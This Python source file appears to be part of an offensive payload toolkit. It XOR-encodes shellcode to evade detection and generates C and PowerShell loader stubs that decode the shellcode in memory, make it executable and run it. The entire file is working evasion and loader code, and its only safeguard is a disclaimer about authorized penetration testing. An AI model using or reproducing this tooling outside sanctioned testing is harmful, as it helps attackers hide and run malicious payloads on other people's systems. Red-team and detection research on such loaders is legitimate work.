"""XOR Encoder — simple XOR with random per-byte rolling key.

Generates a self-contained C decoder stub that can be compiled
alongside the encoded shellcode.

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import os
import secrets
import textwrap


class XorEncoder:
    """XOR encode shellcode with a random single-byte or rolling key.

    Single-byte XOR is trivial to detect, so we support:
      - single:  XOR every byte with the same key (fast, weak)
      - rolling: XOR each byte with key ^ (index % 256) (rolling key)
      - chained: XOR each byte with key ^ previous_ciphertext (self-modifying)
    """

    def __init__(self, mode: str = "rolling"):
        if mode not in ("single", "rolling", "chained"):
            raise ValueError(f"Unknown XOR mode: {mode}")
        self.mode = mode

    def encode(self, data: bytes, key: int | None = None) -> tuple[bytes, int]:
        """Encode data, returning (encoded_bytes, key)."""
        if key is None:
            key = secrets.randbelow(255) + 1  # never 0

        if self.mode == "single":
            encoded = bytes(b ^ key for b in data)

        elif self.mode == "rolling":
            encoded = bytes(b ^ (key ^ (i & 0xFF)) for i, b in enumerate(data))

        else:  # chained
            result = bytearray(len(data))
            prev = key
            for i, b in enumerate(data):
                enc = b ^ prev
                result[i] = enc
                prev = enc
            encoded = bytes(result)

        return encoded, key

    def decode(self, data: bytes, key: int) -> bytes:
        """Decode (for testing)."""
        if self.mode == "single":
            return bytes(b ^ key for b in data)
        if self.mode == "rolling":
            return bytes(b ^ (key ^ (i & 0xFF)) for i, b in enumerate(data))
        # chained
        result = bytearray(len(data))
        prev = key
        for i, b in enumerate(data):
            result[i] = b ^ prev
            prev = b
        return bytes(result)

    def decoder_c_stub(self, encoded: bytes, key: int, arch: str = "x64") -> str:
        """Generate a C loader stub that XOR-decodes then executes the shellcode."""
        sc_hex = ", ".join(f"0x{b:02x}" for b in encoded)
        sz     = len(encoded)

        if self.mode == "single":
            decode_loop = f"""\
    for (size_t i = 0; i < SC_LEN; i++) sc[i] ^= {key};"""
        elif self.mode == "rolling":
            decode_loop = f"""\
    for (size_t i = 0; i < SC_LEN; i++) sc[i] ^= ({key} ^ (unsigned char)(i & 0xFF));"""
        else:
            decode_loop = f"""\
    unsigned char prev = {key};
    for (size_t i = 0; i < SC_LEN; i++) {{
        unsigned char c = sc[i]; sc[i] = c ^ prev; prev = c;
    }}"""

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — XOR Decoder Stub ({self.mode})
         * Key: 0x{key:02x}  Size: {sz} bytes
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #ifdef _WIN32
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #else
        #include <stdlib.h>
        #include <string.h>
        #include <sys/mman.h>
        #endif
        #include <stddef.h>

        static unsigned char sc[] = {{ {sc_hex} }};
        #define SC_LEN {sz}

        int main(void) {{
        {decode_loop}

        #ifdef _WIN32
            void *exec = VirtualAlloc(NULL, SC_LEN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (!exec) return 1;
            memcpy(exec, sc, SC_LEN);
            DWORD old;
            VirtualProtect(exec, SC_LEN, PAGE_EXECUTE_READ, &old);
        #else
            void *exec = mmap(NULL, SC_LEN, PROT_READ|PROT_WRITE|PROT_EXEC,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            if (exec == (void *)-1) return 1;
            memcpy(exec, sc, SC_LEN);
        #endif
            ((void(*)())exec)();
            return 0;
        }}
        """)

    def decoder_ps1_stub(self, encoded: bytes, key: int) -> str:
        """Generate a PowerShell in-memory XOR decoder."""
        b64 = __import__("base64").b64encode(encoded).decode()
        if self.mode == "single":
            decode_expr = f"$sc[$i] = $sc[$i] -bxor {key}"
        elif self.mode == "rolling":
            decode_expr = f"$sc[$i] = $sc[$i] -bxor ({key} -bxor ($i -band 0xFF))"
        else:
            decode_expr = f"$prev = {key}; for ($i=0;$i -lt $sc.Length;$i++) {{ $c=$sc[$i]; $sc[$i]=$c -bxor $prev; $prev=$c }}"

        return textwrap.dedent(f"""\
        # Forge Payload — PowerShell XOR Decoder ({self.mode})
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        $sc = [Convert]::FromBase64String('{b64}')
        for ($i = 0; $i -lt $sc.Length; $i++) {{ {decode_expr} }}
        $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
        $old = [System.UInt32]0
        $kernel32 = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        '@ -Name 'K32' -Namespace 'P' -PassThru
        $kernel32::VirtualProtect($mem, [uint]$sc.Length, 0x20, [ref]$old) | Out-Null
        $t = $kernel32::CreateThread([IntPtr]::Zero,[uint]0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero)
        $kernel32::WaitForSingleObject($t, 0xFFFFFFFF) | Out-Null
        """)
